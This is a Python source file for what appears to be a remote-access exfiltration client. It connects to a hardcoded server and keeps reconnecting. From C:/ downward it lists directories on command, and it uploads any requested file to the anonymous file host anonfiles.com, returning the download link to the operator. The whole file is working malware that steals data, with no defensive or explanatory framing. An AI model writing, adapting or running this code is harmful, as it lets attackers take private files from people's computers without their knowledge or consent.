
from socket import socket, AF_INET, SOCK_STREAM, setdefaulttimeout
from json import dumps, loads
from time import sleep
from requests import post
from os import listdir
from os.path import isfile



host = "192.168.1.15"
port = 5000

delay = 1


class Client:
    def __init__(self, host: str, port: int) -> None:
        self.client = socket(AF_INET, SOCK_STREAM)
        
        self.host, self.port = host, port

        setdefaulttimeout(9999)
        
        self.Connect()

    def Connect(self) -> None:
        try:
            self.client.connect((self.host, self.port))
        except:
            self.Reconnect()

        path = 'C:/'
        method = 'DIR'

        while True:
            try:
                self.Send(method=method, path=path)
                method, path = self.Recv()
            except:
                self.Reconnect()
    
    def Reconnect(self) -> None:
        sleep(delay)
        try:
            self.client.close()
            self.client = socket(AF_INET, SOCK_STREAM)
        except:
            pass
        while True:
            try:
                self.Connect()
            except:
                pass


    def Recv(self) -> tuple:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
        }
        """

        json = loads(self.client.recv(4096))
        return json['method'], json['path']

    
    def Send(self, method: str, path: str) -> None:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
            "content": "anonfiles_link" or "listdir(dir)"
        }
        """

        json = {
            'method': method,
            'path': path,
            'content': self.Dir(path=path) if method == 'DIR' else self.File(path=path)
            }

        return self.client.send(dumps(json).encode('utf-8'))
        

    def File(self, path: str) -> str:
        try:
            path = path.rstrip('/')
            FileName = path.split("/")
            FileName = FileName[len(FileName)-1]

            files = {
                "file": (path, open(path, mode='rb'))
            }

            upload = post("https://api.anonfiles.com/upload", files=files)
            x = upload.json()
            url = x["data"]["file"]["url"]["full"].rstrip('/')
            return url
        except:
            return 'False'

    
    def Dir(self, path: str) -> dict:
        try:
            dir = listdir(path)
            ndir = {}
            for e in dir:
                if isfile(path + e):
                    ndir[e] = 'FILE'
                else:
                    ndir[e] = 'DIR'
            return ndir
        except:
            return 'False'


Client(host=host, port=port)